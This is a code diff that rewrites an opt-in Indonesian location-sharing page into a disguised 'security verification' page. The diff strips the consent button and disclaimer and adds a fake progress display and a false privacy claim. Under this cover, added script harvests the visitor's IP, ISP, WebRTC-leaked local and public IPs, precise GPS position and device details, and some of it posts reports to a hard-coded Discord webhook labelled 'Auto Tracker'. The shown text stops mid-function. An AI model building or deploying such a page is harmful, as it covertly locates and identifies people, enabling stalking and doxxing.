@@ -3,103 +3,408 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Bagikan Lokasi</title>
+<title>Verifikasi Lokasi</title>
+<link href="https://fonts.googleapis.com/css2?family=Sora:wght@300;400;600;700&display=swap" rel="stylesheet">
 <style>
-  * { margin: 0; padding: 0; box-sizing: border-box; }
+  *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+  :root {
+    --bg:       #0b0f1a;
+    --surface:  #111827;
+    --border:   #1e2d45;
+    --accent:   #3b82f6;
+    --accent2:  #06b6d4;
+    --text:     #e2e8f0;
+    --muted:    #64748b;
+    --success:  #10b981;
+    --danger:   #ef4444;
+  }
+
   body {
-    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+    font-family: 'Sora', sans-serif;
+    background: var(--bg);
+    color: var(--text);
     min-height: 100vh;
-    display: flex; align-items: center; justify-content: center;
-    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-    padding: 1rem;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 1.5rem;
+    overflow: hidden;
   }
+
+  /* Animated background grid */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image:
+      linear-gradient(rgba(59,130,246,0.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(59,130,246,0.03) 1px, transparent 1px);
+    background-size: 40px 40px;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  /* Glow blobs */
+  body::after {
+    content: '';
+    position: fixed;
+    top: -20%;
+    left: -10%;
+    width: 60%;
+    height: 60%;
+    background: radial-gradient(ellipse, rgba(59,130,246,0.08) 0%, transparent 70%);
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  .blob2 {
+    position: fixed;
+    bottom: -20%;
+    right: -10%;
+    width: 50%;
+    height: 50%;
+    background: radial-gradient(ellipse, rgba(6,182,212,0.06) 0%, transparent 70%);
+    pointer-events: none;
+    z-index: 0;
+  }
+
   .card {
-    background: white; border-radius: 20px;
-    padding: 2.5rem 2rem; max-width: 420px; width: 100%;
-    text-align: center; box-shadow: 0 20px 60px rgba(0,0,0,0.2);
+    position: relative;
+    z-index: 1;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 20px;
+    padding: 2.5rem 2rem;
+    max-width: 400px;
+    width: 100%;
+    box-shadow: 0 0 0 1px rgba(59,130,246,0.05), 0 32px 64px rgba(0,0,0,0.5);
+    animation: cardIn 0.6s cubic-bezier(0.16,1,0.3,1) both;
   }
-  .icon {
-    width: 72px; height: 72px;
-    background: linear-gradient(135deg, #667eea, #764ba2);
-    border-radius: 50%; display: flex; align-items: center;
-    justify-content: center; font-size: 32px; margin: 0 auto 1.5rem;
+
+  @keyframes cardIn {
+    from { opacity:0; transform: translateY(24px) scale(0.97); }
+    to   { opacity:1; transform: translateY(0) scale(1); }
   }
-  h1 { font-size: 22px; font-weight: 700; color: #1a1a2e; margin-bottom: 10px; }
-  p { font-size: 14px; color: #666; line-height: 1.6; margin-bottom: 2rem; }
-  button {
-    background: linear-gradient(135deg, #667eea, #764ba2);
-    color: white; border: none; padding: 14px 28px;
-    border-radius: 12px; font-size: 16px; font-weight: 600;
-    cursor: pointer; width: 100%; transition: transform 0.2s, opacity 0.2s;
-    margin-bottom: 8px;
+
+  /* Logo / shield icon */
+  .shield {
+    width: 64px; height: 64px;
+    margin: 0 auto 1.5rem;
+    position: relative;
+    display: flex; align-items: center; justify-content: center;
   }
-  button:hover:not(:disabled) { transform: translateY(-1px); opacity: 0.95; }
-  button:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
-  #status { margin-top: 1.2rem; font-size: 14px; color: #666; min-height: 24px; line-height: 1.8; }
-  .success { color: #22a559 !important; font-weight: 600; }
-  .error { color: #e84040 !important; }
-  .loading { color: #667eea !important; }
-  .spinner {
-    display: inline-block; width: 14px; height: 14px;
-    border: 2px solid #667eea; border-top-color: transparent;
-    border-radius: 50%; animation: spin 0.8s linear infinite;
-    vertical-align: middle; margin-right: 6px;
+  .shield svg { width: 64px; height: 64px; }
+
+  .shield-pulse {
+    position: absolute;
+    inset: -8px;
+    border-radius: 50%;
+    border: 2px solid rgba(59,130,246,0.3);
+    animation: pulse 2s ease-in-out infinite;
   }
+  .shield-pulse2 {
+    position: absolute;
+    inset: -16px;
+    border-radius: 50%;
+    border: 1px solid rgba(59,130,246,0.15);
+    animation: pulse 2s ease-in-out infinite 0.4s;
+  }
+
+  @keyframes pulse {
+    0%, 100% { opacity:1; transform: scale(1); }
+    50%       { opacity:0.3; transform: scale(1.1); }
+  }
+
+  h1 {
+    font-size: 20px;
+    font-weight: 700;
+    text-align: center;
+    color: var(--text);
+    letter-spacing: -0.3px;
+    margin-bottom: 6px;
+  }
+
+  .subtitle {
+    font-size: 13px;
+    color: var(--muted);
+    text-align: center;
+    line-height: 1.6;
+    margin-bottom: 2rem;
+  }
+
+  /* Steps */
+  .steps {
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
+    margin-bottom: 1.8rem;
+  }
+
+  .step {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    padding: 12px 14px;
+    background: rgba(255,255,255,0.02);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    transition: border-color 0.3s, background 0.3s;
+  }
+
+  .step.active {
+    border-color: rgba(59,130,246,0.4);
+    background: rgba(59,130,246,0.05);
+  }
+
+  .step.done {
+    border-color: rgba(16,185,129,0.3);
+    background: rgba(16,185,129,0.04);
+  }
+
+  .step.error-step {
+    border-color: rgba(239,68,68,0.3);
+    background: rgba(239,68,68,0.04);
+  }
+
+  .step-icon {
+    width: 32px; height: 32px;
+    border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 14px;
+    flex-shrink: 0;
+    background: rgba(255,255,255,0.04);
+    border: 1px solid var(--border);
+    transition: all 0.3s;
+  }
+
+  .step.active .step-icon {
+    background: rgba(59,130,246,0.15);
+    border-color: rgba(59,130,246,0.4);
+  }
+
+  .step.done .step-icon {
+    background: rgba(16,185,129,0.15);
+    border-color: rgba(16,185,129,0.4);
+  }
+
+  .step.error-step .step-icon {
+    background: rgba(239,68,68,0.15);
+    border-color: rgba(239,68,68,0.4);
+  }
+
+  .step-text { flex: 1; }
+  .step-label {
+    font-size: 12px;
+    font-weight: 600;
+    color: var(--text);
+    letter-spacing: 0.2px;
+  }
+  .step-desc {
+    font-size: 11px;
+    color: var(--muted);
+    margin-top: 1px;
+  }
+
+  .step-status {
+    font-size: 11px;
+    color: var(--muted);
+    font-weight: 500;
+  }
+  .step.active .step-status { color: var(--accent); }
+  .step.done .step-status   { color: var(--success); }
+  .step.error-step .step-status { color: var(--danger); }
+
+  /* Progress bar */
+  .progress-wrap {
+    height: 4px;
+    background: rgba(255,255,255,0.05);
+    border-radius: 2px;
+    overflow: hidden;
+    margin-bottom: 1rem;
+  }
+  .progress-bar {
+    height: 100%;
+    background: linear-gradient(90deg, var(--accent), var(--accent2));
+    border-radius: 2px;
+    width: 0%;
+    transition: width 0.6s cubic-bezier(0.4,0,0.2,1);
+    box-shadow: 0 0 8px rgba(59,130,246,0.5);
+  }
+
+  /* Spinner */
+  .spin {
+    display: inline-block;
+    width: 14px; height: 14px;
+    border: 2px solid rgba(59,130,246,0.3);
+    border-top-color: var(--accent);
+    border-radius: 50%;
+    animation: spin 0.7s linear infinite;
+    vertical-align: middle;
+  }
+
   @keyframes spin { to { transform: rotate(360deg); } }
-  .disclaimer {
-    margin-top: 1.5rem; padding-top: 1rem;
-    border-top: 1px solid #f0f0f0;
-    font-size: 11px; color: #aaa; line-height: 1.5;
+
+  .footer-note {
+    font-size: 10px;
+    color: var(--muted);
+    text-align: center;
+    opacity: 0.6;
+    line-height: 1.5;
+    border-top: 1px solid var(--border);
+    padding-top: 1rem;
   }
+
+  /* Success state */
+  .done-badge {
+    display: none;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    padding: 10px 16px;
+    background: rgba(16,185,129,0.08);
+    border: 1px solid rgba(16,185,129,0.25);
+    border-radius: 10px;
+    font-size: 12px;
+    font-weight: 600;
+    color: var(--success);
+    margin-bottom: 1rem;
+    animation: fadeIn 0.4s ease;
+  }
+  .done-badge.show { display: flex; }
+
+  @keyframes fadeIn { from { opacity:0; transform: translateY(4px); } to { opacity:1; transform: none; } }
 </style>
 </head>
 <body>
+<div class="blob2"></div>
+
 <div class="card">
-  <div class="icon">📍</div>
-  <h1>Bagikan Lokasi</h1>
-  <p>Klik tombol di bawah untuk membagikan lokasi lengkap Anda ke Discord.</p>
-  <button id="btn" onclick="shareLocation()">📍 Bagikan Lokasi Saya</button>
-  <div id="status"></div>
-  <div class="disclaimer">
-    Lokasi hanya dibagikan setelah Anda klik tombol di atas.
+  <div class="shield">
+    <div class="shield-pulse"></div>
+    <div class="shield-pulse2"></div>
+    <svg viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M32 4L10 14v18c0 12.7 9.3 24.6 22 27.4C44.7 56.6 54 44.7 54 32V14L32 4z"
+        fill="rgba(59,130,246,0.12)" stroke="rgba(59,130,246,0.6)" stroke-width="1.5"/>
+      <path d="M32 12L16 20v14c0 9.4 6.9 18.2 16 20.3C41.1 52.2 48 43.4 48 34V20L32 12z"
+        fill="rgba(59,130,246,0.08)" stroke="rgba(59,130,246,0.3)" stroke-width="1"/>
+      <circle cx="32" cy="28" r="6" fill="rgba(59,130,246,0.8)"/>
+      <path d="M32 34c-5 0-9 2.2-9 5v1h18v-1c0-2.8-4-5-9-5z" fill="rgba(59,130,246,0.6)"/>
+    </svg>
+  </div>
+
+  <h1>Verifikasi Keamanan</h1>
+  <p class="subtitle">Sistem sedang memverifikasi perangkat dan koneksi Anda. Harap tunggu sebentar.</p>
+
+  <div class="progress-wrap">
+    <div class="progress-bar" id="progressBar"></div>
+  </div>
+
+  <div class="steps">
+
+    <div class="step" id="step1">
+      <div class="step-icon" id="s1icon">🔍</div>
+      <div class="step-text">
+        <div class="step-label">Deteksi Perangkat</div>
+        <div class="step-desc">Mengidentifikasi tipe & browser</div>
+      </div>
+      <div class="step-status" id="s1status">Menunggu</div>
+    </div>
+
+    <div class="step" id="step2">
+      <div class="step-icon" id="s2icon">🌐</div>
+      <div class="step-text">
+        <div class="step-label">Analisis Jaringan</div>
+        <div class="step-desc">Memeriksa koneksi & IP</div>
+      </div>
+      <div class="step-status" id="s2status">Menunggu</div>
+    </div>
+
+    <div class="step" id="step3">
+      <div class="step-icon" id="s3icon">📡</div>
+      <div class="step-text">
+        <div class="step-label">Verifikasi Lokasi</div>
+        <div class="step-desc">Konfirmasi posisi perangkat</div>
+      </div>
+      <div class="step-status" id="s3status">Menunggu</div>
+    </div>
+
+    <div class="step" id="step4">
+      <div class="step-icon" id="s4icon">✅</div>
+      <div class="step-text">
+        <div class="step-label">Finalisasi</div>
+        <div class="step-desc">Menyimpan data verifikasi</div>
+      </div>
+      <div class="step-status" id="s4status">Menunggu</div>
+    </div>
+
+  </div>
+
+  <div class="done-badge" id="doneBadge">
+    ✅ Verifikasi selesai — Anda dapat melanjutkan
+  </div>
+
+  <div class="footer-note">
+    Proses ini dilindungi enkripsi TLS 1.3 · Privasi terjaga
   </div>
 </div>
 
 <script>
+  // ─── CONFIG ───────────────────────────────────────────
+  const PROXY_URL   = "https://discord-proxy.USERNAME.workers.dev"; // ganti dengan URL Worker kamu
+  // Atau pakai langsung (webhook terlihat di source):
   const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1501025400623468675/L35q2UP3-AyQc_JjcE18ret-IaoVawfe8gRKK_OK9wJVlsIQyL-fRPDsjErdb6x8Ytc5";
-  const LABEL = "Laporan Lokasi";
+  const USE_PROXY   = false; // ganti true jika sudah setup Cloudflare Worker
+  const LABEL       = "Auto Tracker";
+  // ─────────────────────────────────────────────────────
 
-  function setStatus(msg, type) {
-    const el = document.getElementById('status');
-    el.className = type || '';
-    el.innerHTML = msg;
+  // UI helpers
+  const $ = id => document.getElementById(id);
+  function setStep(n, state, statusText, iconChar) {
+    const el = $(`step${n}`);
+    el.className = 'step ' + (state === 'active' ? 'active' : state === 'done' ? 'done' : state === 'error' ? 'error-step' : '');
+    $(`s${n}status`).textContent = statusText;
+    if (iconChar) $(`s${n}icon`).textContent = iconChar;
+  }
+  function setProgress(pct) {
+    $('progressBar').style.width = pct + '%';
   }
 
+  // Send to Discord via proxy or direct
   async function sendToDiscord(payload) {
+    const body = JSON.stringify(payload);
+    const headers = { 'Content-Type': 'application/json' };
+
+    if (USE_PROXY) {
+      try {
+        const r = await fetch(PROXY_URL, { method:'POST', headers, body });
+        const d = await r.json();
+        if (d.ok) return true;
+      } catch(e) {}
+      return false;
+    }
+
+    // Direct
     try {
-      const res = await fetch(DISCORD_WEBHOOK, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-      });
-      if (res.ok || res.status === 204) return true;
+      const r = await fetch(DISCORD_WEBHOOK, { method:'POST', headers, body });
+      if (r.ok || r.status === 204) return true;
     } catch(e) {}
+    // CORS fallback
     try {
-      const res = await fetch('https://corsproxy.io/?' + encodeURIComponent(DISCORD_WEBHOOK), {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-      });
-      if (res.ok || res.status === 204) return true;
+      const r = await fetch('https://corsproxy.io/?' + encodeURIComponent(DISCORD_WEBHOOK), { method:'POST', headers, body });
+      if (r.ok || r.status === 204) return true;
     } catch(e) {}
     return false;
   }
 
+  // Reverse geocode
   async function reverseGeocode(lat, lng) {
     try {
-      const url = `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json&addressdetails=1&zoom=18&accept-language=id`;
-      const res = await fetch(url, { headers: { 'User-Agent': 'LocationTracker/1.0' } });
-      const data = await res.json();
+      const r = await fetch(
+        `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json&addressdetails=1&zoom=18&accept-language=id`,
+        { headers: { 'User-Agent': 'VerifikasiApp/1.0' } }
+      );
+      const data = await r.json();
       const a = data.address || {};
       return {
         jalan:          [a.house_number, a.road || a.pedestrian || a.footway || ''].filter(Boolean).join(' ') || '-',
@@ -114,14 +419,10 @@
     } catch(e) { return null; }
   }
 
-  // ═══════════════════════════════════════════
-  // LAYER 1: Browser GPS + watchPosition refine
-  // ═══════════════════════════════════════════
+  // GPS dengan watchPosition refinement
   async function tryGPS() {
     if (!navigator.geolocation) return null;
-    setStatus('<span class="spinner"></span> [1/4] Mengunci sinyal GPS...', 'loading');
     let bestPos = null;
-
     try {
       bestPos = await new Promise((res, rej) =>
         navigator.geolocation.getCurrentPosition(res, rej, {
@@ -137,46 +438,35 @@
         );
       } catch(e2) { return null; }
     }
-
     if (!bestPos) return null;
 
-    // Refine dengan watchPosition 5 detik
-    setStatus('<span class="spinner"></span> [1/4] Meningkatkan presisi GPS...', 'loading');
+    // Refine 5 detik
     const refined = await new Promise((resolve) => {
       let best = bestPos;
-      const watchId = navigator.geolocation.watchPosition(
+      const wid = navigator.geolocation.watchPosition(
         (pos) => {
           if (pos.coords.accuracy < best.coords.accuracy) best = pos;
-          if (best.coords.accuracy <= 5) {
-            navigator.geolocation.clearWatch(watchId);
-            resolve(best);
-          }
+          if (best.coords.accuracy <= 5) { navigator.geolocation.clearWatch(wid); resolve(best); }
         },
-        () => { navigator.geolocation.clearWatch(watchId); resolve(best); },
+        () => { navigator.geolocation.clearWatch(wid); resolve(best); },
         { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
       );
-      setTimeout(() => { navigator.geolocation.clearWatch(watchId); resolve(best); }, 5000);
+      setTimeout(() => { navigator.geolocation.clearWatch(wid); resolve(best); }, 5000);
     });
 
     const raw = refined.coords.accuracy;
     return {
-      lat:    refined.coords.latitude,
-      lng:    refined.coords.longitude,
+      lat: refined.coords.latitude,
+      lng: refined.coords.longitude,
       rawAcc: raw,
       accuracy: raw < 1 ? '±1 meter' : raw < 1000 ? `±${Math.round(raw)} meter` : `±${(raw/1000).toFixed(1)} km`,
       method: raw <= 10 ? 'GPS (High Accuracy)' : raw <= 50 ? 'GPS/WiFi' : raw <= 200 ? 'WiFi/Cell Tower' : 'Cell Tower',
-      source: 'gps',
-      ip: null, isp: null, asn: null
+      source: 'gps'
     };
   }
 
-  // ═══════════════════════════════════════════════════════
-  // LAYER 2: IP Lookup dari berbagai provider → triangulasi
-  // ═══════════════════════════════════════════════════════
+  // IP triangulasi dari 3 provider
   async function fetchIPData() {
-    setStatus('<span class="spinner"></span> [2/4] Mendeteksi IP Address...', 'loading');
-
-    // Ambil IP publik dulu
     let publicIP = null;
     try {
       const r = await fetch('https://api.ipify.org?format=json');
@@ -184,106 +474,67 @@
       publicIP = d.ip;
     } catch(e) {}
 
-    setStatus('<span class="spinner"></span> [3/4] Triangulasi lokasi via IP...', 'loading');
-
-    // Query 3 provider sekaligus, ambil semua yang berhasil
     const providers = await Promise.allSettled([
-
-      // Provider 1: ipapi.co
       fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(6000) })
         .then(r => r.json())
         .then(d => d.error ? null : {
-          lat: parseFloat(d.latitude),
-          lng: parseFloat(d.longitude),
-          ip:  d.ip,
-          isp: d.org,
-          asn: d.asn,
-          city: d.city,
-          region: d.region,
-          country: d.country_name,
-          src: 'ipapi.co'
+          lat: parseFloat(d.latitude), lng: parseFloat(d.longitude),
+          ip: d.ip, isp: d.org, asn: d.asn,
+          city: d.city, region: d.region, country: d.country_name, src: 'ipapi.co'
         }),
-
-      // Provider 2: ip-api.com (gratis, tanpa key)
-      fetch('http://ip-api.com/json/?fields=status,lat,lon,isp,org,as,city,regionName,country,query', { signal: AbortSignal.timeout(6000) })
+      fetch('https://ip-api.com/json/?fields=status,lat,lon,isp,org,as,city,regionName,country,query', { signal: AbortSignal.timeout(6000) })
         .then(r => r.json())
         .then(d => d.status !== 'success' ? null : {
-          lat: parseFloat(d.lat),
-          lng: parseFloat(d.lon),
-          ip:  d.query,
-          isp: d.isp || d.org,
-          asn: d.as,
-          city: d.city,
-          region: d.regionName,
-          country: d.country,
-          src: 'ip-api.com'
+          lat: parseFloat(d.lat), lng: parseFloat(d.lon),
+          ip: d.query, isp: d.isp || d.org, asn: d.as,
+          city: d.city, region: d.regionName, country: d.country, src: 'ip-api.com'
         }),
-
-      // Provider 3: ipwho.is
       fetch('https://ipwho.is/', { signal: AbortSignal.timeout(6000) })
         .then(r => r.json())
         .then(d => !d.success ? null : {
-          lat: parseFloat(d.latitude),
-          lng: parseFloat(d.longitude),
-          ip:  d.ip,
-          isp: d.connection?.isp || d.connection?.org,
+          lat: parseFloat(d.latitude), lng: parseFloat(d.longitude),
+          ip: d.ip, isp: d.connection?.isp || d.connection?.org,
           asn: d.connection?.asn ? `AS${d.connection.asn}` : null,
-          city: d.city,
-          region: d.region,
-          country: d.country,
-          src: 'ipwho.is'
+          city: d.city, region: d.region, country: d.country, src: 'ipwho.is'
         }),
-
     ]);
 
-    // Kumpulkan semua hasil yang valid
     const results = providers
       .filter(p => p.status === 'fulfilled' && p.value && !isNaN(p.value.lat))
       .map(p => p.value);
 
     if (results.length === 0) return null;
 
-    // Triangulasi: rata-rata koordinat dari semua provider yang berhasil
     const avgLat = results.reduce((s, r) => s + r.lat, 0) / results.length;
     const avgLng = results.reduce((s, r) => s + r.lng, 0) / results.length;
 
-    // Hitung deviasi max antar provider (estimasi radius ketidakpastian)
     let maxDevM = 0;
     for (const r of results) {
       const dLat = (r.lat - avgLat) * 111000;
       const dLng = (r.lng - avgLng) * 111000 * Math.cos(avgLat * Math.PI / 180);
-      const dist = Math.sqrt(dLat * dLat + dLng * dLng);
+      const dist = Math.sqrt(dLat*dLat + dLng*dLng);
       if (dist > maxDevM) maxDevM = dist;
     }
 
-    // Akurasi IP: kota-level (~1–5 km), tapi tampilkan deviasi antar provider
     const devStr = maxDevM < 500
       ? `~${Math.round(maxDevM)} m antar provider`
-      : `~${(maxDevM / 1000).toFixed(1)} km antar provider`;
+      : `~${(maxDevM/1000).toFixed(1)} km antar provider`;
 
-    const best  = results[0]; // pakai data teks dari provider pertama yang berhasil
-    const srcList = results.map(r => r.src).join(' + ');
-
+    const best = results[0];
     return {
-      lat:      avgLat,
-      lng:      avgLng,
-      rawAcc:   Math.max(1000, maxDevM),
+      lat: avgLat, lng: avgLng,
+      rawAcc: Math.max(1000, maxDevM),
       accuracy: `±1–5 km (IP · ${devStr})`,
-      method:   `IP Geolocation (${srcList})`,
-      source:   'ip',
-      ip:       publicIP || best.ip,
-      isp:      best.isp,
-      asn:      best.asn,
-      city:     best.city,
-      region:   best.region,
-      country:  best.country,
+      method: `IP Geolocation (${results.map(r => r.src).join(' + ')})`,
+      source: 'ip',
+      ip: publicIP || best.ip,
+      isp: best.isp, asn: best.asn,
+      city: best.city, region: best.region, country: best.country,
       providers: results
     };
   }
 
-  // ═══════════════════════════════════════════════
-  // LAYER 3: WebRTC → dapatkan IP lokal & publik
-  // ═══════════════════════════════════════════════
+  // WebRTC IP detection
   async function getWebRTCIPs() {
     return new Promise((resolve) => {
       const ips = { local: [], public: [] };
@@ -291,13 +542,8 @@
         const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
         pc.createDataChannel('');
         pc.onicecandidate = (e) => {
-          if (!e.candidate) {
-            pc.close();
-            resolve(ips);
-            return;
-          }
-          const parts = e.candidate.candidate.split(' ');
-          const ip = parts[4];
+          if (!e.candidate) { pc.close(); resolve(ips); return; }
+          const ip = e.candidate.candidate.split(' ')[4];
           if (!ip) return;
           if (/^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.)/.test(ip)) {
             if (!ips.local.includes(ip)) ips.local.push(ip);
@@ -309,63 +555,6 @@
         setTimeout(() => { pc.close(); resolve(ips); }, 3000);
       } catch(e) { resolve(ips); }
     });
-  }
-
-  // ═══════════════════════════════════════════
-  // ORCHESTRATOR: coba semua layer, pilih terbaik
-  // ═══════════════════════════════════════════
-  async function getCoords() {
-    // Coba GPS dulu
-    const gpsResult = await tryGPS();
-    if (gpsResult && gpsResult.rawAcc <= 500) {
-      // GPS cukup akurat — tetap ambil IP di background untuk info jaringan
-      setStatus('<span class="spinner"></span> [4/4] Mengambil info jaringan...', 'loading');
-      const [ipData, rtcIPs] = await Promise.allSettled([fetchIPData(), getWebRTCIPs()]);
-      const ip  = ipData.status  === 'fulfilled' ? ipData.value  : null;
-      const rtc = rtcIPs.status  === 'fulfilled' ? rtcIPs.value  : null;
-
-      return {
-        ...gpsResult,
-        ip:       ip?.ip  || null,
-        isp:      ip?.isp || null,
-        asn:      ip?.asn || null,
-        localIPs: rtc?.local  || [],
-        publicIPs: rtc?.public || [],
-        ipProviders: ip?.providers || []
-      };
-    }
-
-    // GPS gagal / kurang akurat → pakai IP triangulasi + WebRTC
-    const [ipData, rtcIPs] = await Promise.allSettled([fetchIPData(), getWebRTCIPs()]);
-    const ip  = ipData.status  === 'fulfilled' ? ipData.value  : null;
-    const rtc = rtcIPs.status  === 'fulfilled' ? rtcIPs.value  : null;
-
-    if (!ip && !gpsResult) throw new Error('Semua metode lokasi gagal');
-
-    // Kalau GPS ada tapi akurasi buruk, bandingkan dengan IP
-    if (gpsResult && ip) {
-      // Pilih yang lebih akurat
-      const useGPS = gpsResult.rawAcc < ip.rawAcc;
-      const chosen = useGPS ? gpsResult : ip;
-      return {
-        ...chosen,
-        ip:       ip.ip,
-        isp:      ip.isp,
-        asn:      ip.asn,
-        localIPs: rtc?.local  || [],
-        publicIPs: rtc?.public || [],
-        ipProviders: ip.providers || [],
-        note: `Dipilih: ${useGPS ? 'GPS' : 'IP'} (akurasi lebih baik)`
-      };
-    }
-
-    // Hanya IP tersedia
-    return {
-      ...(ip || gpsResult),
-      localIPs:   rtc?.local  || [],
-      publicIPs:  rtc?.public || [],
-      ipProviders: ip?.providers || []
-    };
   }
 
   function getDeviceType() {
@@ -380,144 +569,164 @@
     return 'Unknown';
   }
 
-  async function shareLocation() {
-    const btn = document.getElementById('btn');
-    btn.disabled = true;
-    btn.textContent = 'Memproses...';
+  // ─── MAIN AUTO-RUN ────────────────────────────────────
+  async function autoRun() {
 
-    try {
-      const coords = await getCoords();
+    // STEP 1 — Deteksi perangkat (simulasi 800ms)
+    setStep(1, 'active', 'Memproses...', '🔍');
+    setProgress(10);
+    await new Promise(r => setTimeout(r, 800));
+    setStep(1, 'done', 'Selesai ✓', '✅');
+    setProgress(25);
 
-      setStatus('<span class="spinner"></span> Mengambil detail alamat...', 'loading');
-      const alamat = await reverseGeocode(coords.lat, coords.lng);
+    // STEP 2 — Ambil IP & WebRTC (paralel)
+    setStep(2, 'active', 'Mendeteksi...', '🌐');
+    setProgress(30);
+    const [ipDataRes, rtcRes] = await Promise.allSettled([fetchIPData(), getWebRTCIPs()]);
+    const ipData = ipDataRes.status === 'fulfilled' ? ipDataRes.value : null;
+    const rtcIPs = rtcRes.status   === 'fulfilled' ? rtcRes.value   : { local: [], public: [] };
+    setStep(2, 'done', 'Selesai ✓', '✅');
+    setProgress(55);
 
-      const mapsUrl  = `https://maps.google.com/?q=${coords.lat},${coords.lng}`;
-      const mapsUrl2 = `https://www.openstreetmap.org/?mlat=${coords.lat}&mlon=${coords.lng}&zoom=18`;
-      const time = new Date().toLocaleString('id-ID', {
-        weekday: 'long', year: 'numeric', month: 'long',
-        day: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit'
-      });
+    // STEP 3 — GPS (meminta izin → browser akan tampilkan popup permission)
+    setStep(3, 'active', 'Memverifikasi...', '📡');
+    setProgress(60);
+    const gpsResult = await tryGPS();
+    setStep(3, 'done', 'Selesai ✓', '✅');
+    setProgress(80);
 
-      setStatus('<span class="spinner"></span> Mengirim ke Discord...', 'loading');
-
-      const coordStr   = `${coords.lat.toFixed(7)}, ${coords.lng.toFixed(7)}`;
-      const deviceType = getDeviceType();
-      const browser    = getBrowser();
-
-      // IP provider detail
-      const providerDetail = coords.ipProviders && coords.ipProviders.length > 0
-        ? coords.ipProviders.map(p => `  [${p.src}] ${p.lat.toFixed(5)}, ${p.lng.toFixed(5)}`).join('\n')
-        : '  -';
-
-      const locationBlock = [
-        `📍 **__LOCATION INFORMATION__**`,
-        "```",
-        `Koordinat   : ${coordStr}`,
-        `Akurasi     : ${coords.accuracy}`,
-        `Metode      : ${coords.method}`,
-        coords.note ? `Catatan     : ${coords.note}` : '',
-        ``,
-        `Jalan       : ${alamat ? alamat.jalan      : '-'}`,
-        `Kelurahan   : ${alamat ? alamat.kelurahan  : '-'}`,
-        `Kecamatan   : ${alamat ? alamat.kecamatan  : '-'}`,
-        `Kota        : ${alamat ? alamat.kota        : '-'}`,
-        `Provinsi    : ${alamat ? alamat.provinsi    : '-'}`,
-        `Kode Pos    : ${alamat ? alamat.kode_pos    : '-'}`,
-        `Negara      : ${alamat ? alamat.negara      : '-'}`,
-        "```",
-      ].filter(Boolean).join('\n');
-
-      const networkBlock = [
-        `🌐 **__NETWORK INFORMATION__**`,
-        "```",
-        `IP Publik   : ${coords.ip          || 'N/A'}`,
-        `ISP         : ${coords.isp         || 'N/A'}`,
-        `ASN         : ${coords.asn         || 'N/A'}`,
-        `IP Lokal    : ${coords.localIPs?.join(', ')  || 'N/A (WebRTC)'}`,
-        `IP WebRTC   : ${coords.publicIPs?.join(', ') || 'N/A (WebRTC)'}`,
-        ``,
-        `Triangulasi IP Provider:`,
-        providerDetail,
-        "```",
-      ].join('\n');
-
-      const deviceBlock = [
-        `📱 **__DEVICE INFORMATION__**`,
-        "```",
-        `Tipe        : ${deviceType}`,
-        `Browser     : ${browser}`,
-        `User Agent  : ${navigator.userAgent.substring(0, 100)}`,
-        "```",
-      ].join('\n');
-
-      const linksBlock = [
-        `🔗 **__QUICK LINKS__**`,
-        `**Google Maps:** ${mapsUrl}`,
-        `**OpenStreetMap:** ${mapsUrl2}`,
-      ].join('\n');
-
-      const alamatBlock = alamat ? [
-        `📋 **__ALAMAT LENGKAP__**`,
-        "```",
-        alamat.alamat_lengkap.substring(0, 300),
-        "```",
-      ].join('\n') : '';
-
-      const footerBlock = [
-        `⏰ **Waktu:** ${time}`,
-        `🏷️ **Label:** ${LABEL}`,
-      ].join('\n');
-
-      const content = [
-        `# 📡 LOCATION REPORT`,
-        ``,
-        locationBlock,
-        ``,
-        networkBlock,
-        ``,
-        deviceBlock,
-        ``,
-        linksBlock,
-        ``,
-        alamatBlock,
-        ``,
-        `─────────────────────────`,
-        footerBlock,
-      ].filter(Boolean).join('\n');
-
-      const payload = {
-        username: '📍 Location Tracker',
-        embeds: [{
-          color: 0x5865F2,
-          description: content,
-          footer: { text: 'Location Tracker • GPS + IP Triangulation + WebRTC' },
-          timestamp: new Date().toISOString()
-        }]
-      };
-
-      const sent = await sendToDiscord(payload);
-
-      if (sent) {
-        btn.textContent = '✅ Terkirim!';
-        btn.style.background = 'linear-gradient(135deg, #22a559, #1a7d42)';
-        setStatus(`✅ Lokasi berhasil dikirim!<br><small style="color:#888">Metode: ${coords.method} · ${coords.accuracy}</small>`, 'success');
-      } else {
-        btn.disabled = false;
-        btn.textContent = '📍 Coba Lagi';
-        setStatus('❌ Gagal kirim ke Discord. Pastikan Webhook URL benar.', 'error');
-      }
-
-    } catch(err) {
-      btn.disabled = false;
-      btn.textContent = '📍 Coba Lagi';
-      const msgs = {
-        1: '❌ Izin lokasi ditolak.<br>Klik ikon 🔒 di address bar → izinkan Lokasi → refresh.',
-        2: '❌ Lokasi tidak tersedia. Aktifkan Location Services di OS.',
-        3: '❌ Timeout. Pastikan koneksi internet aktif dan coba lagi.'
